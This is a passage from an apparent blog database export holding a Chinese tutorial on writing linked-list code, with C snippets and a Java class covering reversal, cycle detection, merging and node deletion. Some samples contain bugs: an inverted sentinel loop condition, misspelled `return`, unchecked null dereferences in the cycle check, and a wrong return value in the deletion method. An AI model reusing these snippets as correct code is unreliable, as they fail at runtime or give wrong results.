LinkListAlgorithm {\n    public static void main(String[] args) {\n        // 第一个链表，检测是否有环\n        System.out.println(\"链表中环的检测\");\n        Node<Integer> n1 = new Node<>(1);\n        Node<Integer> n2 = new Node<>(2);\n        Node<Integer> n3 = new Node<>(3);\n        n1.next = n2;\n        n2.next = n3;\n        n3.next = n1; // 1->2->3->1\n        System.out.println(isLoop(n1)); // true\n        System.out.println(\"==========================================\");\n        // 链表反转\n        System.out.println(\"链表反转\");\n        Node<Integer> n4 = new Node<>(4);\n        Node<Integer> n5 = new Node<>(5);\n        Node<Integer> n6 = new Node<>(6);\n        Node<Integer> n7 = new Node<>(7);\n        n4.next = n5;\n        n5.next = n6;\n        n6.next = n7;\n        System.out.println(printLinkList(n4)); // 4->5->6->7\n        Node<Integer> head = reverse(n4);\n        System.out.println(printLinkList(head)); // 7->6->5->4\n        System.out.println(\"==========================================\");\n\n        // 求链表的中间节点\n        System.out.println(\"求链表的中间节点\");\n        Node<Integer> n8 = new Node<>(8);\n        Node<Integer> n9 = new Node<>(9);\n        Node<Integer> n10 = new Node<>(10);\n        Node<Integer> n11 = new Node<>(11);\n        Node<Integer> n12 = new Node<>(12);\n        n8.next = n9;\n        n9.next = n10;\n        n10.next = n11;\n        n11.next = n12; // 8->9->10->11->12\n        System.out.println(printLinkList(n8));\n        Node<Integer> mid = middle(n8);\n        System.out.println(\"中间节点是： \" + mid.val);  // 10\n        System.out.println(\"==========================================\");\n\n        // 有序链表合并\n        System.out.println(\"有序链表合并\");\n        Node<Integer> n13 = new Node<>(13);\n        Node<Integer> n14 = new Node<>(14);\n        Node<Integer> n15 = new Node<>(15);\n        n13.next = n14;\n        n14.next = n15;\n        System.out.println(\"第一个链表： \"+printLinkList(n8));\n        System.out.println(\"第二个链表： \"+printLinkList(n13));\n        head = merge(n8, n13);\n        System.out.println(\"合并后的链表： \"+printLinkList(head));\n\n        System.out.println(\"==========================================\");\n        // 删除倒数第2个节点\n        Node<Integer> n16 = new Node<>(16);\n        Node<Integer> n17 = new Node<>(17);\n        Node<Integer> n18 = new Node<>(18);\n        Node<Integer> n19 = new Node<>(19);\n        n16.next = n17;\n        n17.next = n18;\n        n18.next = n19;\n        System.out.println(\"删除前： \"+printLinkList(n16));\n        head = deleteLastKDesc(n16, 3);\n        System.out.println(\"删除后： \"+printLinkList(n16));\n    }\n\n    /** 合并两个有序链表 */\n    private static Node<Integer> merge(Node<Integer> n1, Node<Integer> n2) {\n        // 确定新链表头结点\n        Node<Integer> head, p = n1, q = n2;\n        if (p.val > q.val){\n            head = n2;\n            q = q.next;\n        }else{\n            head = n1;\n            p = p.next;\n        }\n        Node<Integer> r = head;\n        while (p!=null &&q!=null){\n            if (p.val < q.val){\n                r.next = p;\n                p = p.next;\n            }else {\n                r.next = q;\n                q = q.next;\n            }\n            r = r.next;\n        }\n        if (p!=null){\n            r.next = p;\n        }else{\n            r.next = q;\n        };\n        return head;\n    }\n\n    /**查找链表中间节点*/\n    private static Node<Integer> middle(Node<Integer> head) {\n        if (head==null) return null;\n        Node<Integer> p = head;\n        Node<Integer> q = head;\n        while (q.next !=null && q.next.next!=null){\n            q = q.next.next;\n            p = p.next;\n        }\n        return p;\n    }\n\n    /** 链表中环的检测*/\n    private static boolean isLoop(Node<Integer> head){\n        // 采用快慢指针法 如果两个指针相遇，则说明有环\n        Node<Integer> p = head;\n        Node<Integer> q = head.next.next;\n        while (q!=null){\n            p = p.next;\n            q = q.next.next;\n            if (q == p){\n                return true;\n            }\n        }\n        return false;\n    }\n    /**反转链表*/\n    private static Node<Integer> reverse(Node<Integer> head){\n        if (head.next == null)return head;\n        Node<Integer> p;\n        Node<Integer> q;\n        Node<Integer> r;\n        p = head;\n        q = p.next;\n        p.next = null;\n        while (q != null){\n            r = q.next;\n            q.next = p;\n            p = q;\n            q = r;\n        }\n        return p;\n    }\n\n    /**删除链表倒数第K个结点*/\n    private static Node<Integer> deleteLastKDesc(Node<Integer> head, int k){\n        if (head == null || k <0) return null;\n        Node<Integer> p = head;\n\n        while (p != null){\n            p = p.next;\n            k--;\n        }\n        if (k == 0){\n            return head.next;\n        }\n\n        if (k < 0){\n            p = head;\n            while (++k != 0){\n                p = p.next;\n            }\n            p.next = p.next.next;\n        }\n        return p;\n    }\n\n    private static class Node<E> {\n        E val;\n        Node<E> next;\n        Node(E e){\n            this.val = e;\n        }\n    }\n    private static String printLinkList(Node<Integer> head){\n        StringBuilder sb = new StringBuilder();\n        sb.append(\"[\");\n        while (head !=null){\n            if (head.next !=null)\n                sb.append(head.val).append(\", \");\n            else\n                sb.append(head.val);\n            head = head.next;\n        }\n        sb.append(\"]\");\n        return sb.toString();\n    }\n}\n\n```\n\n\n\n\n<script async src=\"//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js\"></script>\n<!-- 信息流广告 -->\n<ins class=\"adsbygoogle\"\n     style=\"display:block\"\n     data-ad-client=\"ca-pub-4127326375481893\"\n     data-ad-slot=\"9105526840\"\n     data-ad-format=\"auto\"\n     data-full-width-responsive=\"true\"></ins>\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>\n","source":"_posts/算法-怎样写好链表代码.md","raw":"---\ntitle: 算法-怎样写好链表代码\ndate: 2018-09-13 11:27:46\ntags: ['算法','链表']\ncategories: 算法\n---\n\n\n上一节讲了链表相关的基础知识，有人可能会说基础知识我都掌握了，但是写链表代码还是很费劲怎么办？确实是这样的，想要写好链表代码并不是容易的事，尤其是那些复杂的链表操作，比如链表反转、有序链表合并等，写的时候非常容易出错。\n\n为什么链表代码这么难写？究竟怎么样才能比较轻松的写出正确的链表代码呢？\n\n只要愿意投入时间，我觉得大多数人都是可以学会的。比如，如果你真能花一整天或者一个周末，就去写链表反转这一个代码，多写几次，知道能毫不费力的写出bug free的代码，这个坎儿还会很难跨吗？\n\n当然，自己有决心并且付出精力是成功的先决条件，除此之外，我们还需要掌握一些技巧和方法。下面我总结了几个写链表的代码技巧，如果能熟练掌握这几个技巧，叫上主动和坚持，轻松拿下链表代码完全没有问题。\n\n### 理解指针或引用的含义\n\n事实上，看懂链表的结构并不是很难，但是一旦把它和指针混在一起，就很容易让人摸不着头脑。所以要想写好链表代码，首先就要理解好指针。\n\n有些语言有“指针”的概念，比如C语言，有些语言没有指针，取而代之的是“引用”，比如Java、Python等。不管是指针还是引用，实际上，它们的意思都是一样的，都是存储所指对象的内存地址。\n\n接下来，我会拿C语言中的指针来讲解。如果你用的是Java或者其他语言也没关系，把它理解成引用就可以了。\n\n实际上，对于指针的理解，只需要记住下面这句话就可以了：**将某个变量赋值给指针，实际上就是将这个变量的地址赋值给指针，或者反过来说，指针中存储了这个变量的内存地址，指向了这个变量，通过指针就能找到这个变量**。\n\n在编写链表代码的时候，经常会有这样的代码：p->next = q，这行代码是说p结点中的next指针存储了q结点的内存地址。还有一个更复杂的，也是写链表代码经常用到的：p->next = p->next->next，意思是说p结点的next指针存储了p结点的下下一个结点的内存地址。\n\n掌握了指针或者引用的概念，应该可以很轻松的看懂链表代码。\n\n### 警惕指针丢失和内存泄露\n\n不知道你有没有这样的感觉，写链表代码的时候指针指来指去，一会就不知道指针到哪里了。所以我们在写代码的时候，一定不要弄丢了指针。\n\n{% asset_img 链表插入.jpg %}\n\n如上图所示，当我们在a结点和b结点之间插入结点c，假设当前指针p指向结点a。如果我们将代码写成下面这个样子，就会发生指针丢失和内存泄露。\n\n```C\np->next = c; // 将p的next指针指向c结点\nc->next = p->next; //将c结点next指针指向b结点\n```\n\n当p->next指针在完成第一步操作之后，已经不再指向b结点了，而是指向结点c，因此，第二行代码相当于将c->next指针指向了自己。因此整个链表断裂成了两半，从结点b之后的所有结点都无法访问了。\n\n对于有些语言来说，比如C语言，内存管理是由程序员负责的，如果没有手动释放结点对应的内存空间，就会产生内存泄露，所以，我们在插入结点时，一定要注意操作的顺序。要先将c结点的next指针指向b，再将a结点的next指针指向c，这样才不会丢失指针，导致内存泄露。\n\n### 利用哨兵简化实现难度\n\n首先，我们回顾一下单链表的插入、删除操作。如果我们在结点p之后插入一个结点，只需要下面两行代码就可以了。\n\n```C\nnew_node->next = p->next; \np->next = new_node; \n```\n\n但是当我们向一个空链表中插入第一个结点，刚刚的逻辑就不能用了。我们需要进行下面这样的特殊处理，其中head表示链表的头结点。所以从这段代码可以看出，对于单链表的插入操作，第一个结点和其他结点的插入逻辑是不同的。\n\n```C\nif (head == null)\n{\n\thead = new_node;\n}\n```\n\n同样再来看一下链表的删除操作，如果要删除p结点的后继点点，我们只需要一行代码就可以搞定：\n\n```C\np->next = p->next->next；\n```\n\n但是如果要删除链表的最后一个结点，这样的代码就不行了。跟插入类似，我们也需要对这种情况特殊处理。代码如下：\n\n```C\nif (head->next == null)\n{\n\thead = null;\n}\n```\n\n可以看出，**针对链表的插入、删除操作，需要对第一个结点的插入和最后一个结点的删除情况进行特殊处理**。这样代码实现起来就会很繁琐，不简洁，而且也容易因为考虑不全而出错。那如何来解决这个问题呢？\n\n这时上面提到的哨兵就出场了。现实中的哨兵，解决的是国家之间的边界问题。同理我们这里的哨兵也是解决“边界问题的”，不直接参与业务逻辑。\n\n还记得如何表示一个空链表呢？head=null表示链表中没有结点了，其中head表示头结点指针，指向链表中的第一个结点。\n\n如果我们引入哨兵结点，在任何时候，不管链表是不是为空，head指针都会一直指向这个哨兵结点。我们把这种有哨兵的链表叫做**带头链表**，相反，没有哨兵结点的链表叫做**不带头链表**。\n\n如下我画了一个带头链表，可以发现，哨兵结点是不存储数据的。因为哨兵结点一直存在，所以插入第一个结点和插入其他结点，删除最后一个结点和删除其他结点，都可以统一为相同的代码实现逻辑。\n\n{% asset_img 带头链表.jpg %}\n\n实际上，这种利用哨兵简化编程难度的技巧，在很多代码实现中都有用到，比如插入排序、归并排序、动态规划等。这里用C语言实现一个简单的例子，不涉及语法方面的高级知识，你可以类比其他语言。\n\n代码一：\n\n```C\n// 在数组a中，查找key，返回key所在的位置，其中n代表数组，a代表长度\nint find(char* a, int n, char key){\n\t// 边界条件处理，如果a为空，或者n<=0\n\tif(a == null || n<=0){\n\t\treturn -1;\n\t}\n\n\tint i=0;\n\t// 这里有两个比较操作： i<n 和 a[i] == key\n\twhile(i<n){\n\t\tif(a[i] == key){\n\t\t\tretrun i;\n\t\t}\n\t\t++i;\n\t}\n\n\tretrun -1;\n}\n```\n\n代码二：\n\n```C\n// 在数组a中，查找key，返回key所在的位置，其中n代表数组，a代表长度\n// 为了更好的解释，这里举了个例子来说明\n// a = {4,2,3,5,9,6} key = 7\nint find(char* a, int n, char key){\n\t// 边界条件处理，如果a为空，或者n<=0\n\tif(a == null || n<=0){\n\t\treturn -1;\n\t}\n\t// 这里因为要将a[n-1]设为哨兵，所以特殊处理这个值\n\tif(a[n-1] == key){\n\t\treturn n-1;\n\t}\n\t// 临时变量保存a[n-1]，以便之后恢复，这里temp = 6\n\tchar temp = a[n-1];\n\t// 把key值放到数组a[n-1]，此时a={4,2,3,5,9,7}\n\ta[n-1] = key;\n\n\tint i=0;\n\t// 此时while循环比起代码一，少了i<n这个比较操作\n\twhile(a[i] == key){\n\t\t++i;\n\t}\n\t// 将数组a[n-1] 恢复为原来的值\n\ta[n-1] = temp;\n\n\t// 如果i = n-1，说明数组中没有要找的key\n\tif(i == n-1){\n\t\treturn -1;\n\t}\n\t// 否则，说明找到了key，位置为i\n\telse{\n\t\treturn i;\n\t}\n}\n```\n\n对比两段代码，在字符串a很长的时候，比如几万、几十万，你觉得那段代码执行更快呢？答案是代码二。因为两端代码中执行次数最多的就是while循环那一部分。在第二段代码中，我们通过一个哨兵a[n-1]=key，成功省掉了一个比较语句，不要小看了这一句，当积累上万次、几十万次的时候，累积的时间就很明显了。\n\n当然，这里只是说明哨兵的作用，写代码的时候千万不要写成第二段代码那样，可读性太差了，大部分情况下，我们并不需要追求如此极致的性能。\n\n### 重点留意边界条件处理\n\n软件开发中，代码在以下边界或者异常情况下，最容易产生bug。链表代码也不例外，要实现没有bug的链表代码，一定要在编写的过程中以及编写完成后，检查边界条件是否考虑全面，以及边界条件下代码是否能运行。\n\n我经常用来检查链表代码是否正确执行的边界条件有这么几个：\n\n* 如果链表为空时，代码是否能正常工作？\n* 如果一个链表只包含了一个结点，代码能否正常工作？\n* 如果链表只包含两个结点时，代码能否正常工作？\n* 代码逻辑在处理头结点和尾结点时，是否能正常工作？\n\n当你写完链表代码之后，除了看下你写的代码在正常情况下能否工作，还要看下在上面我列举的杰哥边界条件下，代码能否正常工作。\n\n当然边界条件不止我列举的这些，针对不同的场景，可能还有特定的边界条件，需要自己去思考，不过套路都是一样的。\n\n其实，不光是写链表代码，在写任何代码的时候，千万不要只是实现业务正常情况下的功能就行了，一定要多想想会遇到哪些边界情况或者异常情况，遇到了应该如何应对，这样写出来的代码才够健壮。\n\n### 举列画图，辅助思考\n\n对于稍微复杂的链表操作，比如前面我们提到的单链表反转，指针一会指这，一会指那，总感觉脑容量不够，想不清楚。这时候可以采用举列法和画图法，来进行辅助分析。\n\n你可以找一个具体的例子，把它画在纸上，释放一些脑容量，留更多的给逻辑思考，这样就会感觉思路清晰很多。比如往单链表中插入一个结点，可以先把各种情况都举一个例子，画出插入前和插入后的链表变化，如图所示：\n\n{% asset_img 举例.jpg%}\n\n看着图写代码，是不是简单多了。而且当我们写完代码之后，也可以举几个例子，画在纸上，照着代码走一遍，很容易发现代码中的Bug。\n\n### 多写多练，没有捷径\n\n如果你已经理解并掌握了这些方法，但是手写代码还是会出现各种各样的错误，也不要着急，多写多练。把常见的链表操作多写几遍，出问题就一点点调试，熟能生巧。\n\n下面我精选了5个常见的链表操作，这要把这几个操作写熟练，不熟就多练几遍，保证之后不会在害怕写链表代码。\n\n* 单链表反转\n* 链表中环的检测\n* 两个有序链表合并\n* 删除链表倒数第n个结点\n* 求链表的中间结点\n\n我觉得，写链表代码是最考验逻辑思维能力的，因为链表到处都是指针的操作，边界条件的处理，一个不慎就会产生bug。链表代码写的好坏，可以看出一个人写代码是否细心，考虑问题是否全面，思维是否缜密，所以很多面试都喜欢让人手写链表代码。\n\n```java\n/**\n * 链表的一些算法题目\n */\npublic class LinkListAlgorithm {\n    public static void main(String[] args) {\n        // 第一个链表，检测是否有环\n        System.out.println(\"链表中环的检测\");\n        Node<Integer> n1 = new Node<>(1);\n        Node<Integer> n2 = new Node<>(2);\n        Node<Integer> n3 = new Node<>(3);\n        n1.next = n2;\n        n2.next = n3;\n        n3.next = n1; // 1->2->3->1\n        System.out.println(isLoop(n1)); // true\n        System.out.println(\"==========================================\");\n        // 链表反转\n        System.out.println(\"链表反转\");\n        Node<Integer> n4 = new Node<>(4);\n        Node<Integer> n5 = new Node<>(5);\n        Node<Integer> n6 = new Node<>(6);\n        Node<Integer> n7 = new Node<>(7);\n        n4.next = n5;\n        n5.next = n6;\n        n6.next = n7;\n        System.out.println(printLinkList(n4)); // 4->5->6->7\n        Node<Integer> head = reverse(n4);\n        System.out.println(printLinkList(head)); // 7->6->5->4\n        System.out.println(\"==========================================\");\n\n        // 求链表的中间节点\n        System.out.println(\"求链表的中间节点\");\n        Node<Integer> n8 = new Node<>(8);\n        Node<Integer> n9 = new Node<>(9);\n        Node<Integer> n10 = new Node<>(10);\n        Node<Integer> n11 = new Node<>(11);\n        Node<Integer> n12 = new Node<>(12);\n        n8.next = n9;\n        n9.next = n10;\n        n10.next = n11;\n        n11.next = n12; // 8->9->10->11->12\n        System.out.println(printLinkList(n8));\n        Node<Integer> mid = middle(n8);\n        System.out.println(\"中间节点是： \" + mid.val);  // 10\n        System.out.println(\"==========================================\");\n\n        // 有序链表合并\n        System.out.println(\"有序链表合并\");\n        Node<Integer> n13 = new Node<>(13);\n        Node<Integer> n14 = new Node<>(14);\n        Node<Integer> n15 = new Node<>(15);\n        n13.next = n14;\n        n14.next = n15;\n        System.out.println(\"第一个链表： \"+printLinkList(n8));\n        System.out.println(\"第二个链表： \"+printLinkList(n13));\n        head = merge(n8, n13);\n        System.out.println(\"合并后的链表： \"+printLinkList(head));\n\n        System.out.println(\"==========================================\");\n        // 删除倒数第2个节点\n        Node<Integer> n16 = new Node<>(16);\n        Node<Integer> n17 = new Node<>(17);\n        Node<Integer> n18 = new Node<>(18);\n        Node<Integer> n19 = new Node<>(19);\n        n16.next = n17;\n        n17.next = n18;\n        n18.next = n19;\n        System.out.println(\"删除前： \"+printLinkList(n16));\n        head = deleteLastKDesc(n16, 3);\n        System.out.println(\"删除后： \"+printLinkList(n16));\n    }\n\n    /** 合并两个有序链表 */\n    private static Node<Integer> merge(Node<Integer> n1, Node<Integer> n2) {\n        // 确定新链表头结点\n        Node<Integer> head, p = n1, q = n2;\n        if (p.val > q.val){\n            head = n2;\n            q = q.next;\n        }else{\n            head = n1;\n            p = p.next;\n        }\n        Node<Integer> r = head;\n        while (p!=null &&q!=null){\n            if (p.val < q.val){\n                r.next = p;\n                p = p.next;\n            }else {\n                r.next = q;\n                q = q.next;\n            }\n            r = r.next;\n        }\n        if (p!=null){\n            r.next = p;\n        }else{\n            r.next = q;\n        };\n        return head;\n    }\n\n    /**查找链表中间节点*/\n    private static Node<Integer> middle(Node<Integer> head) {\n        if (head==null) return null;\n        Node<Integer> p = head;\n        Node<Integer> q = head;\n        while (q.next !=null && q.next.next!=null){\n            q = q.next.next;\n            p = p.next;\n        }\n        return p;\n    }\n\n    /** 链表中环的检测*/\n    private static boolean isLoop(Node<Integer> head){\n        // 采用快慢指针法 如果两个指针相遇，则说明有环\n        Node<Integer> p = head;\n        Node<Integer> q = head.next.next;\n        while (q!=null){\n            p = p.next;\n            q = q.next.next;\n            if (q == p){\n                return true;\n            }\n        }\n        return false;\n    }\n    /**反转链表*/\n    private static Node<Integer> reverse(Node<Integer> head){\n        if (head.next == null)return head;\n        Node<Integer> p;\n        Node<Integer> q;\n        Node<Integer> r;\n        p = head;\n        q = p.next;\n        p.next = null;\n        while (q != null){\n            r = q.next;\n            q.next = p;\n            p = q;\n            q = r;\n        }\n        return p;\n    }\n\n    /**删除链表倒数第K个结点*/\n    private static Node<Integer> deleteLastKDesc(Node<Integer> head, int k){\n        if (head == null || k <0) return null;\n        Node<Integer> p = head;\n\n        while (p != null){\n            p = p.next;\n            k--;\n        }\n        if (k == 0){\n            return head.next;\n        }\n\n        if (k < 0){\n            p = head;\n            while (++k != 0){\n                p = p.next;\n            }\n            p.next = p.next.next;\n        }\n        return p;\n    }\n\n    private static class Node<E> {\n        E val;\n        Node<E> next;\n        Node(E e){\n            this.val = e;\n        }\n    }\n    private static String printLinkList(Node<Integer> head){\n        StringBuilder sb = new StringBuilder();\n        sb.append(\"[\");\n        while (head !=null){\n            if (head.next !=null)\n                sb.append(head.val).append(\", \");\n            else\n                sb.append(head.val);\n            head = head.next;\n        }\n        sb.append(\"]\");\n        return sb.toString();\n    }\n}\n\n```\n\n\n\n\n<script async src=\"//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js\"></script>\n<!-- 信息流广告 -->\n<ins class=\"adsbygoogle\"\n     style=\"display:block\"\n     data-ad-client=\"ca-pub-4127326375481893\"\n     data-ad-slot=\"9105526840\"\n     data-ad-format=\"auto\"\n     data-full-width-responsive=\"true\"></ins>\n<script>\n(adsbygoogle = window.adsbygoogle || []).push({});\n</script>\n","slug":"算法-怎样写好链表代码","published":1,"updated":"2018-11-29T09:59:50.713Z","_id":"cjpdmv0fi003q4cv0r1suvxds","comments":1,"layout":"post","photos":[],"link":"","content":"<p>上一节讲了链表相关的基础知识，有人可能会说基础知识我都掌握了，但是写链表代码还是很费劲怎么办？确实是这样的，想要写好链表代码并不是容易的事，尤其是那些复杂的链表操作，比如链表反转、有序链表合并等，写的时候非常容易出错。</p>\n<p>为什么链表代码这么难写？究竟怎么样才能比较轻松的写出正确的链表代码呢？</p>\n<p>只要愿意投入时间，我觉得大多数人都是可以学会的。比如，如果你真能花一整天或者一个周末，就去写链表反转这一个代码，多写几次，知道能毫不费力的写出bug free的代码，这个坎儿还会很难跨吗？</p>\n<p>当然，自己有决心并且付出精力是成功的先决条件，除此之外，我们还需要掌握一些技巧和方法。下面我总结了几个写链表的代码技巧，如果能熟练掌握这几个技巧，叫上主动和坚持，轻松拿下链表代码完全没有问题。</p>\n<h3 id=\"理解指针或引用的含义\"><a href=\"#理解指针或引用的含义\" class=\"headerlink\" title=\"理解指针或引用的含义\"></a>理解指针或引用的含义</h3><p>事实上，看懂链表的结构并不是很难，但是一旦把它和指针混在一起，就很容易让人摸不着头脑。所以要想写好链表代码，首先就要理解好指针。</p>\n<p>有些语言有“指针”的概念，比如C语言，有些语言没有指针，取而代之的是“引用”，比如Java、Python等。不管是指针还是引用，实际上，它们的意思都是一样的，都是存储所指对象的内存地址。</p>\n<p>接下来，我会拿C语言中的指针来讲解。如果你用的是Java或者其他语言也没关系，把它理解成引用就可以了。</p>\n<p>实际上，对于指针的理解，只需要记住下面这句话就可以了：<strong>将某个变量赋值给指针，实际上就是将这个变量的地址赋值给指针，或者反过来说，指针中存储了这个变量的内存地址，指向了这个变量，通过指针就能找到这个变量</strong>。</p>\n<p>在编写链表代码的时候，经常会有这样的代码：p-&gt;next = q，这行代码是说p结点中的next指针存储了q结点的内存地址。还有一个更复杂的，也是写链表代码经常用到的：p-&gt;next = p-&gt;next-&gt;next，意思是说p结点的next指针存储了p结点的下下一个结点的内存地址。</p>\n<p>掌握了指针或者引用的概念，应该可以很轻松的看懂链表代码。</p>\n<h3 id=\"警惕指针丢失和内存泄露\"><a href=\"#警惕指针丢失和内存泄露\" class=\"headerlink\" title=\"警惕指针丢失和内存泄露\"></a>警惕指针丢失和内存泄露</h3><p>不知道你有没有这样的感觉，写链表代码的时候指针指来指去，一会就不知道指针到哪里了。所以我们在写代码的时候，一定不要弄丢了指针。</p>\n<img src=\"/posts/2018-09-13-算法-怎样写好链表代码/链表插入.jpg\">\n<p>如上图所示，当我们在a结点和b结点之间插入结点c，假设当前指针p指向结点a。如果我们将代码写成下面这个样子，就会发生指针丢失和内存泄露。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">p-&gt;next = c; <span class=\"comment\">// 将p的next指针指向c结点</span></span><br><span class=\"line\">c-&gt;next = p-&gt;next; <span class=\"comment\">//将c结点next指针指向b结点</span></span><br></pre></td></tr></table></figure>\n<p>当p-&gt;next指针在完成第一步操作之后，已经不再指向b结点了，而是指向结点c，因此，第二行代码相当于将c-&gt;next指针指向了自己。因此整个链表断裂成了两半，从结点b之后的所有结点都无法访问了。</p>\n<p>对于有些语言来说，比如C语言，内存管理是由程序员负责的，如果没有手动释放结点对应的内存空间，就会产生内存泄露，所以，我们在插入结点时，一定要注意操作的顺序。要先将c结点的next指针指向b，再将a结点的next指针指向c，这样才不会丢失指针，导致内存泄露。</p>\n<h3 id=\"利用哨兵简化实现难度\"><a href=\"#利用哨兵简化实现难度\" class=\"headerlink\" title=\"利用哨兵简化实现难度\"></a>利用哨兵简化实现难度</h3><p>首先，我们回顾一下单链表的插入、删除操作。如果我们在结点p之后插入一个结点，只需要下面两行代码就可以了。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">new_node-&gt;next = p-&gt;next; </span><br><span class=\"line\">p-&gt;next = new_node;</span><br></pre></td></tr></table></figure>\n<p>但是当我们向一个空链表中插入第一个结点，刚刚的逻辑就不能用了。我们需要进行下面这样的特殊处理，其中head表示链表的头结点。所以从这段代码可以看出，对于单链表的插入操作，第一个结点和其他结点的插入逻辑是不同的。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">if</span> (head == null)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\thead = new_node;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>同样再来看一下链表的删除操作，如果要删除p结点的后继点点，我们只需要一行代码就可以搞定：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">p-&gt;next = p-&gt;next-&gt;next；</span><br></pre></td></tr></table></figure>\n<p>但是如果要删除链表的最后一个结点，这样的代码就不行了。跟插入类似，我们也需要对这种情况特殊处理。代码如下：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">if</span> (head-&gt;next == null)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\thead = null;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>可以看出，<strong>针对链表的插入、删除操作，需要对第一个结点的插入和最后一个结点的删除情况进行特殊处理</strong>。这样代码实现起来就会很繁琐，不简洁，而且也容易因为考虑不全而出错。那如何来解决这个问题呢？</p>\n<p>这时上面提到的哨兵就出场了。现实中的哨兵，解决的是国家之间的边界问题。同理我们这里的哨兵也是解决“边界问题的”，不直接参与业务逻辑。</p>\n<p>还记得如何表示一个空链表呢？head=null表示链表中没有结点了，其中head表示头结点指针，指向链表中的第一个结点。</p>\n<p>如果我们引入哨兵结点，在任何时候，不管链表是不是为空，head指针都会一直指向这个哨兵结点。我们把这种有哨兵的链表叫做<strong>带头链表</strong>，相反，没有哨兵结点的链表叫做<strong>不带头链表</strong>。</p>\n<p>如下我画了一个带头链表，可以发现，哨兵结点是不存储数据的。因为哨兵结点一直存在，所以插入第一个结点和插入其他结点，删除最后一个结点和删除其他结点，都可以统一为相同的代码实现逻辑。</p>\n<img src=\"/posts/2018-09-13-算法-怎样写好链表代码/带头链表.jpg\">\n<p>实际上，这种利用哨兵简化编程难度的技巧，在很多代码实现中都有用到，比如插入排序、归并排序、动态规划等。这里用C语言实现一个简单的例子，不涉及语法方面的高级知识，你可以类比其他语言。</p>\n<p>代码一：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 在数组a中，查找key，返回key所在的位置，其中n代表数组，a代表长度</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">find</span><span class=\"params\">(<span class=\"keyword\">char</span>* a, <span class=\"keyword\">int</span> n, <span class=\"keyword\">char</span> key)</span></span>&#123;</span><br><span class=\"line\">\t<span class=\"comment\">// 边界条件处理，如果a为空，或者n&lt;=0</span></span><br><span class=\"line\">\t<span class=\"keyword\">if</span>(a == null || n&lt;=<span class=\"number\">0</span>)&#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> <span class=\"number\">-1</span>;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">int</span> i=<span class=\"number\">0</span>;</span><br><span class=\"line\">\t<span class=\"comment\">// 这里有两个比较操作： i&lt;n 和 a[i] == key</span></span><br><span class=\"line\">\t<span class=\"keyword\">while</span>(i&lt;n)&#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span>(a[i] == key)&#123;</span><br><span class=\"line\">\t\t\tretrun i;</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t\t++i;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\tretrun <span class=\"number\">-1</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>代码二：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 在数组a中，查找key，返回key所在的位置，其中n代表数组，a代表长度</span></span><br><span class=\"line\"><span class=\"comment\">// 为了更好的解释，这里举了个例子来说明</span></span><br><span class=\"line\"><span class=\"comment\">// a = &#123;4,2,3,5,9,6&#125; key = 7</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">find</span><span 